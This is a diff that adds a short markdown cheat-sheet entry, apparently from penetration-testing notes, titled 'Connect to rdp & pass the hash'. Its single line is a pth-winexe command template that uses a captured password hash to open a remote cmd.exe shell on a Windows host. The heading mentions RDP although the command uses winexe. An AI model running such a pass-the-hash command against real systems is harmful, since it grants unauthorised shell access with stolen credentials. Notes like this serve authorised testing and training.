@@ -1,0 +1,5 @@
+---
+tags: [ rdp, pass_the_hash ]
+---
+# Connect to rdp & pass the hash
+pth-winexe -U <hostname>/<user> //<ip> cmd.exe
